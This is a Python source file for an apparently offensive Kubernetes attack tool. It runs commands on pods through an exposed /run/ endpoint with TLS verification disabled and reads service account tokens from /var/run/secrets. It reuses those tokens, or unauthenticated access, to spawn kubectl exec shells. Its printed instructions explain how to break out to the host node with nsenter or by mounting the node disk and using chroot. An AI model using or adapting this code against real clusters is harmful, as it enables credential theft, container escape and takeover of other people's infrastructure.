import requests, pty

def shell(comando, hostFull, namespace, pod, container, id):
    if comando == "exit":
        return "exit"
    else:
        comando_req = requests.post(hostFull + "/run/" + namespace[id] + "/" + pod[id] + "/" + container[id], data={"cmd":comando}, verify=False)
        comando_res_bytes = comando_req.content
        comando_res_str = comando_res_bytes.decode("utf-8")
        return comando_res_str


def hostShell(host, hostFull, namespace, pod, container):
    num = int(input("Pod ID: "))
    id = num - 1
    serviceaccount = requests.post(hostFull + "/run/" + namespace[id] + "/" + pod[id] + "/" + container[id], data={"cmd":"cat /var/run/secrets/kubernetes.io/serviceaccount/token"}, verify=False)
    serviceaccount_res_bytes = serviceaccount.content
    serviceaccount_res_str = serviceaccount_res_bytes.decode("utf-8")

    namespace_serviceaccount = requests.post(hostFull + "/run/" + namespace[id] + "/" + pod[id] + "/" + container[id], data={"cmd":"cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"}, verify=False)
    namespace_serviceaccount_res_bytes = namespace_serviceaccount.content
    namespace_serviceaccount_res_str = namespace_serviceaccount_res_bytes.decode("utf-8")

    if "126:" in serviceaccount_res_str or "126:" in namespace_serviceaccount_res_str:
        print("--- SHELL IN POD NOT POSSIBLE ---")
    else:
        print("+++ SERVICE ACCOUNT E NAMESPACE OBTIDO DO POD " + pod[id] + " +++")
        print()
        print("SERVICE ACCOUNT: " + serviceaccount_res_str)
        print()
        print("NAMESPACE: " + namespace_serviceaccount_res_str)
        print()
        print("*** TRYING TO GET A SHELL IN BUSYBOX ***")
        shell_txt = "kubectl --insecure-skip-tls-verify=true -s https://"+(host)+":8443 --token="+(serviceaccount_res_str)+" -n "+(namespace_serviceaccount_res_str)+" exec -it " + (pod[id]) + " -- /bin/sh"
        shell_txt = shell_txt.split(" ")
        print()
        print("AFTER GETTING THE SHELL IN BUSYBOX, RUN THE COMMAND *** nsenter -t 1 -m -u -n -i sh *** TO GET A SHELL IN NODE!")
        print()
        pty.spawn(shell_txt)

def shell_api(hostFull, ns, pod_name):

    if pod_name == "busybox-filesystem":
        print()
        print("TO GET COMPLETE ACCESS TO THE NODE FILESYSTEM, FIRST RUN THE COMMAND *** fdisk -l *** AND GET THE DISK NAME. EX.: /dev/dm-0")
        print()
        print("AFTER THIS, RUN THE COMMAND  *** mkdir mnt && mkdir /mnt/busybox && mount /dev/DISK_NAME /mnt/busybox && chroot /mnt/busybox ***")
        print()
    elif pod_name == "busybox-rce":
        print()
        print("AFTER GETTING THE SHELL IN BUSYBOX, RUN THE COMMAND *** nsenter -t 1 -m -u -n -i sh *** TO GET A SHELL IN NODE!")
        print()
    shell_pod = "kubectl --insecure-skip-tls-verify=true --username=system:unauthenticated --server=" + (hostFull) + " -n " + (ns) + " exec -it " + (pod_name) + " -- /bin/sh"
    shell_pod = shell_pod.split(" ")
    print()
    pty.spawn(shell_pod)
    print()

def shell_service(host, serviceaccount, ns, pod_name):
    shell_pod = "kubectl --insecure-skip-tls-verify=true --server=https://" + (host) + ":8443 --token=" + (serviceaccount) + " -n " + (ns) + " exec -it " + pod_name + " -- /bin/sh"
    shell_pod = shell_pod.split(" ")
    if pod_name == "busybox-filesystem":
        print()
        print("TO GET COMPLETE ACCESS TO THE NODE FILESYSTEM, FIRST RUN THE COMMAND *** fdisk -l *** AND GET THE DISK NAME. EX.: /dev/dm-0")
        print()
        print("AFTER THIS, RUN THE COMMAND  *** mkdir mnt && mkdir /mnt/busybox && mount /dev/DISK_NAME /mnt/busybox && chroot /mnt/busybox ***")
        print()
    elif pod_name == "busybox-rce":
        print()
        print("AFTER GETTING THE SHELL IN BUSYBOX, RUN THE COMMAND *** nsenter -t 1 -m -u -n -i sh *** TO GET A SHELL IN NODE!")
        print()
    pty.spawn(shell_pod)
    print()